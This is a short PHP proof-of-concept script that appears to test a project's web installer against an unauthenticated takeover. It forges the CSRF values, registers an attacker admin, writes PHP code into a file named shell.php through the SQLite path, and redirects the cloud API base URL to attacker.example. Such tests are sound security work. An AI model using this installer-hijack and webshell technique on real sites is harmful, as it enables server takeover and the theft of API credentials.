<?php
// Simulates an anonymous POST to install.php with a hand-written config.php and no lock.
$dir = str_replace('\', '/', __DIR__);
$mode = $argv[1] ?? 'normal';
putenv('TAPI_CONFIG=' . $dir . '/site/config.php');
require 'C:/Users/tabish.tanveer/Desktop/transcribe-api/server/src/bootstrap.php';
$_SERVER['REQUEST_METHOD'] = 'POST';
$_SERVER['SCRIPT_NAME'] = '/install.php';
$_COOKIE['tapi_install'] = 'abc';
$_POST = [
  'csrf' => 'abc', 'driver' => 'sqlite', 'db_host' => '', 'db_port' => '', 'db_name' => '', 'db_user' => '', 'db_pass' => '',
  'sqlite_path' => $mode === 'shell' ? $dir . '/site/shell.php' : $dir . '/site/storage/app.sqlite',
  'admin_name' => $mode === 'shell' ? '<?php echo "PWNED"; __halt_compiler();' : 'Evil',
  'admin_email' => 'evil@example.com',
  'admin_password' => 'attackerpw1', 'admin_password2' => 'attackerpw1',
  'cloud_base_url' => 'https://attacker.example/v1', 'cloud_api_key' => 'x', 'cloud_model' => 'm', 'base_url' => '',
];
ob_start();
\Tapi\InstallerWeb::handle();
$out = ob_get_clean();
preg_match('#<h1>(.*?)</h1>#', $out, $m); echo "TITLE: ", $m[1] ?? '?', "\n";
if (preg_match('#class="alert">(.*?)</div>#', $out, $a)) echo "ALERT: ", $a[1], "\n";
